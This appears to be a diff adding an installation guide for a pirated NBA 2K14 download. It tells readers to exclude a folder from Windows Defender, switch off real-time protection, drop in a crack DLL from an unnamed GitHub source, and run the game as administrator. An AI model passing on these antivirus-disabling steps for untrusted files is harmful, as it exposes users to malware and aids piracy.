@@ -1,0 +1,82 @@
+Link: https://www.facebook.com/Dodzkie24/posts/default-nba2k14-pcdownload-link-nmsdownload-link-consider-donatingg-cash-0963664/465335795612657/
+
+================================================================================
+                       NBA 2K14 - COMPLETE INSTALLATION GUIDE
+================================================================================
+Follow these steps exactly to copy the successful installation to your second PC 
+without errors.
+
+--------------------------------------------------------------------------------
+STEP 1: CREATE A SAFE GAME FOLDER
+--------------------------------------------------------------------------------
+1. Open File Explorer.
+2. Go to your Downloads folder (or preferred storage drive).
+3. Right-click an empty space.
+4. Select New > Folder.
+5. Name the folder: NBA2K14
+
+--------------------------------------------------------------------------------
+STEP 2: SET UP THE WINDOWS ANTIVIRUS EXCLUSION
+--------------------------------------------------------------------------------
+* This prevents Windows Defender from instantly deleting your files during 
+  extraction.
+
+1. Open the Start Menu, type Windows Security, and open it.
+2. Click on "Virus & threat protection".
+3. Click "Manage settings" under the threat settings header.
+4. Scroll to the bottom and click "Add or remove exclusions".
+5. Click "Add an exclusion" > "Folder".
+6. Select the empty NBA2K14 folder you made in Step 1.
+7. Click "Select Folder" to confirm.
+
+--------------------------------------------------------------------------------
+STEP 3: TURN OFF REAL-TIME PROTECTION TEMPORARILY
+--------------------------------------------------------------------------------
+* This keeps the system gates completely open while copying files safely.
+
+1. Go back one screen in Windows Security to the protection settings page.
+2. Toggle "Real-time protection" to OFF.
+
+--------------------------------------------------------------------------------
+STEP 4: EXTRACT THE GAME INTO THE SAFE FOLDER
+--------------------------------------------------------------------------------
+1. Open your NBA2K14.rar file using WinRAR.
+2. Click the "Extract To" button on the top toolbar.
+3. In the destination tree on the right, browse to your new NBA2K14 folder.
+4. Click OK and let the extraction fully finish.
+
+--------------------------------------------------------------------------------
+STEP 5: INSTALL THE MISSING WINDOWS FILES
+--------------------------------------------------------------------------------
+* Older games require legacy files to talk to modern graphics cards and 
+  controllers.
+
+[ DirectX Update ]
+1. Search Google for "DirectX End-User Runtime Web Installer".
+2. Download it directly from Microsoft's official site.
+3. Run dxwebsetup.exe.
+   -> IMPORTANT: Uncheck the "Bing Bar" offer during setup!
+
+[ C++ Update ]
+1. Search Google for "Visual C++ 2010 Redistributable x86".
+2. Download it from Microsoft.
+3. Run vcredist_x86.exe to install the required code engine.
+
+NOTE: If you run the game later and it says rld.dll is missing, download 
+a clean copy from the community Incase repository on GitHub and paste it 
+directly into this folder.
+
+--------------------------------------------------------------------------------
+STEP 6: REACTIVATE ANTIVIRUS AND PLAY
+--------------------------------------------------------------------------------
+1. Go back to Windows Security.
+2. Turn "Real-time protection" back ON. 
+   (Your game folder is excluded, so it is safe).
+3. Open your NBA2K14 folder.
+4. Scroll down and right-click nba2k14.exe.
+5. Select Properties and go to the Compatibility tab.
+6. Check the box for "Run this program as an administrator".
+7. Click Apply, then click OK.
+8. Double-click nba2k14.exe to launch the game!
+
+================================================================================
